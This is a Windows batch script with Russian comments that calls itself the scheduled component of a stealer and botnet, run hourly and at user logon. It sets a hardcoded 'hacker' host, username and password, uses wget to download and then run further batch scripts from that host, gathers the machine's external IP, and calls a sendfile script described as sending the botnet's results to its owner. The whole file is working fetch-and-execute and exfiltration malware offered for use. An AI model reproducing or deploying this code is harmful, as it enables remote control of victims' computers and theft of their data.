@echo on
rem Сценарий Windows, выполняемый каждый час и при входе пользователя в систему
rem Служит для оффлайн подачи команд хозяина стайлера, когда онлайн доступ не работает.
rem Для работы стайлера нужна обязательная часть, которую нужно удалить 
rem только при прекращении работы стайлера,
rem и одну переменную часть, которая напрямую не связана с работой стайлера и которую
rem можно менять.

REM TEST
set Hacker_host2=yuden.server.grandkozel.ru
set Hacker_User=yuden
set Hacker_Pass=0a9s8d7F

Rem !!! Обязательная часть ботнета 1

rem Загружаем пользовательские файлы, специфичные для пользователя


rem Определяем переменные:
rem Основная папка
set Mainfolder=Private
rem Префикс протокола
set pref=http
rem HTTP Port
set port=80

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Util
 
rem Переходим в каталог сервера

rem cd /d %LocalFolder%
 
rem Генерируем Wget команды

wget --http-user=%user% -nc --http-passwd=%password% %host%/user_dayly1.bat
wget --http-user=%user% -nc --http-passwd=%password% %host%/user_hourly1.bat
wget --http-user=%user% -nc --http-passwd=%password% %host%/user_onstart1.bat
wget --http-user=%user% -nc --http-passwd=%password% %host%/sendfile.cmd

REM Получаем внешний IP адрес маршрутизатора
call "%PUB1%\Util\getip_1.cmd"
REM !!! Конец обязательной части 1 !!!
REM Обязательная часть 2. Сюда можно вставлять произвольные пользовательские программы

call "%PUB1%\Util\user_hourly1.bat"

REM !!! Обязательная часть 3 !!!
rem Отправка результатов работы ботнета хозяину
rem Файл sendfile.cmd можно подгружать в первой части

call "%PUB1%\Util\sendfile.cmd"

REM Конец скрипта
